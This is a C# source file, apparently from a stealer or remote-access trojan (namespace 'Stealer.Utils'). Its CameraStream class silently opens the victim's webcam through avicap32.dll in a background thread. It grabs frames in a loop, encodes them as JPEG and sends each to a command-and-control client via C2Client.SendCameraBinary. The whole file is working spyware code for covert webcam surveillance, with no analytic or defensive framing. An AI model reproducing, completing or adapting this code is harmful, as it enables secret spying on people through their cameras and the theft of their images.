using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace Stealer.Utils
{
    public static class CameraStream
    {
        private static Thread _captureThread;
        private static volatile bool _running;

        // DirectShow / capCreateCaptureWindowA via avicap32.dll
        [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA", CharSet = CharSet.Ansi)]
        private static extern IntPtr capCreateCaptureWindowA(
            string lpszWindowName,
            int dwStyle,
            int x, int y,
            int nWidth, int nHeight,
            IntPtr hWndParent,
            int nID);

        [DllImport("user32.dll")]
        private static extern bool DestroyWindow(IntPtr hWnd);

        [DllImport("user32.dll", EntryPoint = "SendMessageA")]
        private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern bool OpenClipboard(IntPtr hWndNewOwner);

        [DllImport("user32.dll")]
        private static extern bool EmptyClipboard();

        [DllImport("user32.dll")]
        private static extern IntPtr GetClipboardData(uint uFormat);

        [DllImport("user32.dll")]
        private static extern bool CloseClipboard();

        private const uint WM_CAP_START = 0x0400;
        private const uint WM_CAP_DRIVER_CONNECT = WM_CAP_START + 10;
        private const uint WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + 11;
        private const uint WM_CAP_EDIT_COPY = WM_CAP_START + 30;
        private const uint WM_CAP_GRAB_FRAME = WM_CAP_START + 60;
        private const uint CF_BITMAP = 2;

        private static int _selectedCamIndex = 0;

        public static void Start(int fps, int quality, int camIndex = 0)
        {
            if (_running) Stop();
            _selectedCamIndex = camIndex;
            _running = true;
            _captureThread = new Thread(() => CaptureLoop(fps, quality)) { IsBackground = true };
            _captureThread.Start();
        }

        public static void Stop()
        {
            _running = false;
        }

        private static void CaptureLoop(int fps, int quality)
        {
            int delay = 1000 / Math.Max(fps, 1);
            IntPtr hCap = IntPtr.Zero;

            try
            {
                // Create capture window
                hCap = capCreateCaptureWindowA("CapWindow", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
                if (hCap == IntPtr.Zero)
                {
                    _running = false;
                    return;
                }

                // Automatically detect active camera hardware (try index 0..9)
                IntPtr connected = IntPtr.Zero;
                int foundIndex = -1;
                for (int i = 0; i < 10; i++)
                {
                    connected = SendMessage(hCap, WM_CAP_DRIVER_CONNECT, (IntPtr)i, IntPtr.Zero);
                    if (connected != IntPtr.Zero)
                    {
                        foundIndex = i;
                        break;
                    }
                }

                if (connected == IntPtr.Zero)
                {
                    DestroyWindow(hCap);
                    _running = false;
                    return;
                }

                var jpegEncoder = GetJpegEncoder();
                var qualityParam = new EncoderParameters(1);
                qualityParam.Param[0] = new EncoderParameter(Encoder.Quality, (long)Math.Max(10, Math.Min(quality, 100)));

                while (_running)
                {
                    try
                    {
                        // 1. Grab fresh video frame from camera hardware
                        SendMessage(hCap, WM_CAP_GRAB_FRAME, IntPtr.Zero, IntPtr.Zero);
                        // 2. Copy grabbed frame to clipboard bitmap
                        SendMessage(hCap, WM_CAP_EDIT_COPY, IntPtr.Zero, IntPtr.Zero);

                        if (OpenClipboard(IntPtr.Zero))
                        {
                            IntPtr hBitmap = GetClipboardData(CF_BITMAP);
                            if (hBitmap != IntPtr.Zero)
                            {
                                using (Bitmap bmp = Image.FromHbitmap(hBitmap))
                                {
                                    using (MemoryStream ms = new MemoryStream())
                                    {
                                        bmp.Save(ms, jpegEncoder, qualityParam);
                                        byte[] data = ms.ToArray();
                                        if (data != null && data.Length > 0)
                                        {
                                            C2Client.SendCameraBinary(data);
                                        }
                                    }
                                }
                            }
                            CloseClipboard();
                        }
                    }
                    catch { }

                    Thread.Sleep(delay);
                }

                SendMessage(hCap, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero);
                DestroyWindow(hCap);
            }
            catch
            {
                if (hCap != IntPtr.Zero) DestroyWindow(hCap);
                _running = false;
            }
        }

        private static ImageCodecInfo GetJpegEncoder()
        {
            foreach (var codec in ImageCodecInfo.GetImageEncoders())
            {
                if (codec.MimeType == "image/jpeg") return codec;
            }
            return null;
        }
    }
}
